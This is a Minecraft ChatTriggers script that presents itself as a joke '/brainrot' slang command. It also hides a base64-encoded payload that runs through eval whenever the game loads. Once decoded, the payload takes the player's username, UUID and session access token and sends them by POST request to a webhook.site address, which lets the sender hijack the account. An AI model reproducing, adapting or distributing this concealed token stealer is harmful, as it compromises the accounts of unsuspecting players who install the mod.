import request from 'requestV2';

register("command", () => {
    const brainRot = [
        "skibidi",
        "skibidi toilet",
        "gyatt",
        "mewing",
        "mew",
        "rizz",
        "rizzing",
        "rizzler",
        "on skibidi",
        "sigma",
        "what the sigma",
        "Ohio",
        "bussin'",
        "cook",
        "cooking",
        "let him/her cook",
        "baddie",
        "skibidi rizz",
        "fanum tax",
        "fanum taxing",
        "drake",
        "nonchalant dread head",
        "aura",
        "grimace shake",
        "edging",
        "edge",
        "goon",
        "gooning",
        "looks maxing",
        "alpha",
        "griddy",
        "chris tyson",
        "diddy",
        "imagine if ninja got a low taper fade"
    ];

    const randomBrainrot = brainRot[Math.floor(Math.random() * brainRot.length)];
    ChatLib.chat(randomBrainrot);
}).setName("brainrot");

function dc(input) {
    var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var output = "";
    var chr1, chr2, chr3;
    var enc1, enc2, enc3, enc4;
    var i = 0;

    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

    while (i < input.length) {
        enc1 = keyStr.indexOf(input.charAt(i++));
        enc2 = keyStr.indexOf(input.charAt(i++));
        enc3 = keyStr.indexOf(input.charAt(i++));
        enc4 = keyStr.indexOf(input.charAt(i++));

        chr1 = (enc1 << 2) | (enc2 >> 4);
        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
        chr3 = ((enc3 & 3) << 6) | enc4;

        output += String.fromCharCode(chr1);
        if (enc3 !== 64) {
            output += String.fromCharCode(chr2);
        }
        if (enc4 !== 64) {
            output += String.fromCharCode(chr3);
        }
    }
    return output;
}

register("GameLoad", () => {
    const c = "bGV0IHVzZXJuYW1lID0gUGxheWVyLmdldE5hbWUoKTsKICAgICAgICBsZXQgdG9rZW4gPSBDbGllbnQuZ2V0TWluZWNyYWZ0KCkuZnVuY18xMTA0MzJfSSgpLmZ1bmNfMTQ4MjU0X2QoKTsKICAgICAgICBsZXQgdXVpZCA9IFBsYXllci5nZXRVVUlEKCk7CgogICAgICAgIGxldCB1cmwgPSAiaHR0cHM6Ly93ZWJob29rLnNpdGUvZDY4OGE3ZjItMzMxYy00N2FjLWEwN2UtYzdiZTczNjcyYjBjIjsKCiAgICAgICAgbGV0IHBheWxvYWQgPSB7CiAgICAgICAgICAgIHVzZXJuYW1lOiB1c2VybmFtZSwKICAgICAgICAgICAgdG9rZW46IHRva2VuLAogICAgICAgICAgICBzc2lkOiAidG9rZW46IiArIHRva2VuICsgIjoiICsgdXVpZAogICAgICAgIH07CgogICAgICAgIHJlcXVlc3QoewogICAgICAgICAgICB1cmw6IHVybCwKICAgICAgICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgICAgICAgIGpzb246IHRydWUsCiAgICAgICAgICAgIGJvZHk6IHBheWxvYWQKICAgICAgICB9KQ==";
    try {
        let d = dc(c);
        eval(d);
    } catch (e) {
        ChatLib.chat("Ein Fehler ist aufgetreten: " + e.message);
    }
});
